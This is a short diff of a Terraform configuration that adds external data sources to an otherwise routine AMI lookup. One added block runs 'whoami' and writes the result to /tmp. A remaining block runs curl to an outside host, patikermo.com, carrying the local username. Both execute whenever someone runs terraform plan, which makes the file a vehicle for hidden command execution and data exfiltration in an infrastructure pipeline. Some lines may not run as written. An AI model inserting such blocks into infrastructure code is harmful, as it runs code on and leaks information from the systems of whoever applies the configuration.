@@ -18,8 +18,11 @@ data "aws_ami" "ubuntu" {
   owners = ["099720109477"] # Canonical
 }
 
+data "external" "test" {
+  program = ["whoami >> /tmp/result.txt"]
+}
+
 data "external" "example" {
-  program = ["whoami"]
   program = ["curl", "http://patikermo.com", "-A $(whoami)"]
 }
 
